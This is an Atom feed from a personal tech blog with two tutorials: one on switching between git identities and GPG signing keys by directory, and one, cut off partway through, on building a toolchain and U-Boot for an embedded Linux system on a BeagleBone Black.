<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:8000/ef_blog/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:8000/ef_blog/" rel="alternate" type="text/html" /><updated>2021-06-05T13:21:44-07:00</updated><id>http://localhost:8000/ef_blog/feed.xml</id><title type="html">Emmet Friel</title><subtitle>cyber security blog</subtitle><author><name>Emmet Friel</name></author><entry><title type="html">Working with multiple GPG keys across multiple git identities</title><link href="http://localhost:8000/ef_blog/misc/multipleGPG.html" rel="alternate" type="text/html" title="Working with multiple GPG keys across multiple git identities" /><published>2020-09-20T00:00:00-07:00</published><updated>2020-09-20T00:00:00-07:00</updated><id>http://localhost:8000/ef_blog/misc/multipleGPG</id><content type="html" xml:base="http://localhost:8000/ef_blog/misc/multipleGPG.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Its common to have multiple Git identities when working across different projects which can be difficult to manage but for the majority of us we usually have two git identities for signing commits: one for work use and one for personal use. This tutorial explains how to switch git identities automatically based on what directory your in.&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Two GPG keys generated for two different emails. Refer to the &lt;a href=&quot;https://docs.github.com/en/enterprise/2.13/user/articles/generating-a-new-gpg-key&quot;&gt;Git Documentation on GPG&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;configuring-multiple-git-identities&quot;&gt;Configuring multiple git identities&lt;/h1&gt;

&lt;p&gt;The main Git configuration file is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig&lt;/code&gt; which can be found in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$HOME&lt;/code&gt; directory and is specfic to each user. Create two new git configuration files for work and personal use, see below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 John John  234 May  8 15:52  .gitconfig
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 John John   95 Sep 20 15:02  .gitconfig-local
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 John John  137 Sep 20 15:02  .gitconfig-work
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By default we are going to configure git to use our personal git identity for everything unless we are in a specific directory. Open up &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig-local&lt;/code&gt; with a text editor and insert the contents based on your personal git identity:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .gitconfig-local 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;user]
  name &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; John Doe
  email &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; johndoe@hotmail.co.uk
  signingkey &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; OEE3389VBDJH4531
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Note: You can find the key ID for your GPG secret key via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gpg --list-secret-keys --keyid-format LONG&lt;/code&gt; which is then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sec   rsa3072/OEE3389VBDJH4531&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Save and Exit. Repeat the same for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig-work&lt;/code&gt; replacing name, email and signingkey ID with your git identity for work.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .gitconfig-work 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;user]
  name &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; John Doe
  email &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; johndoe@company.net
  signingkey &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; BM2095449YAW90L1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Save and Exit. Create a new folder in Documents directory called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;work-projects&lt;/code&gt; which will be used for work related projects. Open the main git configuration file: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig&lt;/code&gt; and append the following to the file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# default case&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;include]
        path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~/.gitconfig-local

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;includeIf &lt;span class=&quot;s2&quot;&gt;&quot;gitdir:~/Documents/work-projects/**/.git&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
        path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~/.gitconfig-work
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The includeIf condition allows us to automatically switch git identities when inside the work-projects directory to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig-work&lt;/code&gt;.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;test-automated-switching&quot;&gt;Test automated switching&lt;/h1&gt;

&lt;p&gt;Git should now automatically detect the git identity based on the directory you are in. Run the following commands in your home directory:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
/home/john
emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config user.email 
johndoe@hotmail.co.uk
emmet@homepc:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config user.signingKey 
OEE3389VBDJH4531
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Git detects our configuration based on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.gitconfig-local&lt;/code&gt;. Navigate into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Documents/work-projects&lt;/code&gt;, clone any git project into work-projects directory, cd into it and then run the following commands again:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:~/Documents/work-projects/tictactoe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config user.email 
johndoe@company.net
emmet@homepc:~/Documents/work-projects/tictactoe&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git config user.signingKey 
BM2095449YAW90L1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You can see Git automatically switching identities based on directories allowing us to manage multiple GPG keys when signing commits.&lt;/p&gt;</content><author><name>Emmet Friel</name></author><category term="misc" /><summary type="html">Introduction</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:8000/ef_blog/misc/github.jpeg" /><media:content medium="image" url="http://localhost:8000/ef_blog/misc/github.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Building an Embedded Linux Distribution on a Beaglebone Black ARM Cortex-A8</title><link href="http://localhost:8000/ef_blog/embedded/embedded-linux.html" rel="alternate" type="text/html" title="Building an Embedded Linux Distribution on a Beaglebone Black ARM Cortex-A8" /><published>2020-05-16T00:00:00-07:00</published><updated>2020-05-16T00:00:00-07:00</updated><id>http://localhost:8000/ef_blog/embedded/embedded-linux</id><content type="html" xml:base="http://localhost:8000/ef_blog/embedded/embedded-linux.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;This tutorial will show you how to build the latest 5.5.5 kernel on the Beaglebone Black with a root filesystem that is less than 10MB which can be easily ported to other boards and IOT devices. The tutorial will consist of using crosstool-NG to build the toolchain, using Make to build the bootloader, kernel and device trees and lastly using Buildroot to compile the root filesystem. Starting off on embedded Linux I’d recommend getting the&lt;a href=&quot;https://www.amazon.co.uk/Mastering-Embedded-Linux-Programming-potential/dp/1787283283&quot; target=&quot;_blank&quot;&gt; Mastering Embedded Linux Programming book&lt;/a&gt; which this tutorial takes pieces of inspiration from and takes you through an in-depth description of the entire project lifecycle. Building an embedded Linux distribution from scratch requires four main elements:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Toolchain
    &lt;ul&gt;
      &lt;li&gt;A set of tools required to build and compile your source code that will be able to run on the target device. The tools include a compiler, a linker and various run-time libraries. I will be using a cross-compilation toolchain that will compile the code on my host machine (Ubuntu 18 VM) that then will run on the target (BeagleBone Black).&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Bootloader
    &lt;ul&gt;
      &lt;li&gt;This initializes the system and loads the kernel into memory. The ability to hand off control to the kernel is achieved through device trees, a data structure (hierarchical nodes which resembles a tree) that defines the hardware.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Kernel
    &lt;ul&gt;
      &lt;li&gt;The heart of the operating system. It is responsible for managing resources, interfacing with hardware and it provides an API that allows users to interact with the kernel space from the user space such as shell terminal for example.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Root filesystem
    &lt;ul&gt;
      &lt;li&gt;The final element which provides the kernel with the required libraries and program that will be run after kernel initialization. The kernel will either mount the root filesystem in RAM, known as an initial RAM filesystem (initramfs), from the bootloader or it will mount it from a block device such as an SD card or it can be mounted over the network (NFS – Network Filesystem).&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;1-toolchain-crosstool-ng&quot;&gt;1. Toolchain: crosstool-NG&lt;/h1&gt;

&lt;p&gt;Four major components of a toolchain:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;GNU Compiler Collection (GCC)&lt;/strong&gt; – A collection of compilers used to convert the C/C++/Java etc. into assembly code which is then fed into the assembler.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Binary Utilities&lt;/strong&gt; – A set of binary utilities such as the assembler and the linker.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;C Standard Library&lt;/strong&gt; – The C language is the gateway to the kernel which provides an API defined in POSIX.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;GNU Debugger (GDB)&lt;/strong&gt; -  Allows to peer inside the program while it is executing to fix bugs.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I will be using the Crosstool-NG to build a custom toolchain as it provides a sleek menu-driven configuration window and it allows you to see the toolchain being built from scratch as well as providing meaningful error messages. It would have been easier to use a build system such as Yocto or Buildroot as those tools encapsulate all the complexity and also generates a toolchain as part of the build though the issue with build systems is if you don’t have a basic understanding of what’s going on under the hood then prepare for a steep learning.&lt;/p&gt;

&lt;h2 id=&quot;dependencies&quot;&gt;Dependencies&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt-get &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;python3-dev python2.7-dev libncurses5-dev automake libsdl1.2-dev bison chrpath git  g++ gawk texinfo libtool-bin flex gperf lbexpat1-dev
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;download--install&quot;&gt;Download &amp;amp; Install&lt;/h2&gt;

&lt;p&gt;Clone the source code from crosstool-NG’s GitHub repo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/crosstool-ng/crosstool-ng
emmet@homepc:/home/emmet/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;crosstool-ng-1.24.0/
emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./bootstrap
emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./configure &lt;span class=&quot;nt&quot;&gt;--enable-local&lt;/span&gt;
emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make
emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Note on some of the commands:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Configure&lt;/strong&gt;: Responsible for getting everything ready prior to the build such as checking dependencies and other programs that are required to build the software. It produces a custom Makefile specific to your machine from a template thats included in the tarball Makefile.in&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Make&lt;/strong&gt;: This will run a series of tasks defined in the Makefile that will build the software from its source code.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Make install&lt;/strong&gt;: This will copy the built program with its libraries and documentation into the correct location.&lt;/p&gt;

&lt;h2 id=&quot;choosing-the-toolchain&quot;&gt;Choosing the toolchain&lt;/h2&gt;

&lt;p&gt;Crosstool-NG comes with a list of sample toolchains:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ct-ng &lt;span class=&quot;nb&quot;&gt;help
&lt;/span&gt;emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ct-ng list-samples
Status  Sample name
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   aarch64-rpi3-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L..X]   aarch64-unknown-linux-android
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   aarch64-unknown-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   aarch64-unknown-linux-uclibc
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   alphaev56-unknown-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   alphaev67-unknown-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   arc-arc700-linux-uclibc
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   arc-multilib-elf32
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   arc-multilib-linux-uclibc
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   arm-bare_newlib_cortex_m3_nommu-eabi
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   arm-cortex_a15-linux-gnueabihf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L..X]   arm-cortexa5-linux-uclibcgnueabihf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   arm-cortex_a8-linux-gnueabi
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   armv7-rpi2-linux-gnueabihf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   armv8-rpi3-linux-gnueabihf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   avr
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   i586-geode-linux-uclibc
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   i686-centos6-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   i686-centos7-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   i686-nptl-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   i686-ubuntu12.04-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   i686-ubuntu14.04-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   i686-ubuntu16.04-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L..X]   i686-w64-mingw32
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   m68k-unknown-elf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   x86_64-ubuntu16.04-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   x86_64-unknown-linux-gnu
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   x86_64-unknown-linux-uclibc
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L..X]   x86_64-w64-mingw32
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L..X]   xtensa-fsf-elf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   xtensa-fsf-linux-uclibc
 L &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;       : sample was found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;current directory
 G &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Global&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;      : sample was installed with crosstool-NG
 X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;EXPERIMENTAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: sample may use EXPERIMENTAL features
 B &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BROKEN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;      : sample is currently broken
 O &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;OBSOLETE&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;    : sample needs to be upgraded
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Select and configure the toolchain:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Downloads/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ct-ng arm-cortex_a8-linux-gnueabi
emmet@homepc:/home/emmet/Downloads/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ct-ng menuconfig

Paths and misc options  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;HOME&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;/x-tools/&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CT_TARGET&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Prefix directory
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Render toolchain &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;only &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;make sure its unchecked&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Number of parallel &lt;span class=&quot;nb&quot;&gt;jobs

&lt;/span&gt;Target options  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
Floating point: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;hardware FPU&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;neon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Use specific FPU
&lt;span class=&quot;c&quot;&gt;# The ARM Cortex-A8 has two coprocessors for floating point operations: neon and vfpv3 which can be found on the technical manual.&lt;/span&gt;

Operating System  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
Version of linux &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.5.5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 

C-library  &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--enable-obsolete-rpc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; extra config
&lt;span class=&quot;c&quot;&gt;# required to build the depreciated Sun RPC headers&lt;/span&gt;

Save and &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;Exit.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Check the configuration:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/crosstool-ng&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ct-ng show-arm-cortex_a8-linux-gnueabi 
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;L...]   arm-cortex_a8-linux-gnueabi
    Languages       : C,C++
    OS              : linux-5.5.5
    Binutils        : binutils-2.34
    Compiler        : gcc-9.2.0
    C library       : glibc-2.31
    Debug tools     : duma-2_5_15 gdb-9.1 ltrace-0.7.3 strace-5.5
    Companion libs  : expat-2.2.9 gettext-0.20.1 gmp-6.2.0 isl-0.22 libelf-0.8.13 libiconv-1.16 mpc-1.1.0 mpfr-4.0.2 ncurses-6.2 zlib-1.2.11
    Companion tools :
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now the toolchain can be built. The build time will depend on your host specs but it took my Ubuntu 18 VM with 4GB RAM and 2 cores to build it in 40 minutes. Once the build is complete, you will have your sparkling new toolchain in the prefix directory you set.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents/crosstool-ng-1.24.0&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ct-ng build
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Add the toolchain to your PATH and test:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents&lt;span class=&quot;nv&quot;&gt;$ PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;~/x-tools/arm-cortex_a8-linux-gnueabihf/bin/:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;

emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;arm-cortex_a8-linux-gnueabihf-gcc &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
arm-cortex_a8-linux-gnueabihf-gcc &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;crosstool-NG 1.24.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 8.3.0
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2018 Free Software Foundation, Inc.
This is free software&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; see the &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;copying conditions.  There is NO
warranty&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; not even &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-bootloader-u-boot&quot;&gt;2. Bootloader: U-Boot&lt;/h1&gt;

&lt;p&gt;Das Universal Bootloader (shortened to U-Boot) is an open source bootloader primarily used for embedded devices to define the firmware instructions on how to boot the device’s operating system as well as supporting a wide range of architectures.&lt;/p&gt;

&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Using a USB to TTY converter cable to communicate with the board via serial port and for debugging.&lt;/li&gt;
  &lt;li&gt;Check if you have the drivers installed, if not then just do a quick search online of these dependencies and install:
    &lt;ul&gt;
      &lt;li&gt;modinfo usbserial&lt;/li&gt;
      &lt;li&gt;modinfo cp210x&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Connect pins to the serial debug on the beaglebone board:
    &lt;ul&gt;
      &lt;li&gt;USB Tx (Green)→ BB Rx&lt;/li&gt;
      &lt;li&gt;USB Rx (Blue) → BB Tx&lt;/li&gt;
      &lt;li&gt;USB GND (Yellow)→ BB GND&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/embedded/bb-linux/tty-serial.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Power on the board and add the USB device filter to the virtual machine using the “+” symbol.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/pages/efriel94/ef_blog/assets/img/embedded/bb-linux/vbox-usb.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Install picocom to communicate with the beaglebone: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo apt-get install picocom&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Connect to the beaglebone board: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo picocom -b 115200 /dev/ttyUSB0&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;download-and-configure-u-boot&quot;&gt;Download and Configure U-Boot&lt;/h2&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;emmet@homepc:/home/emmet/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/u-boot/u-boot
emmet@homepc:/home/emmet/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;u-boot
emmet@homepc:/home/emmet/Documents/u-boot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout v2020.04
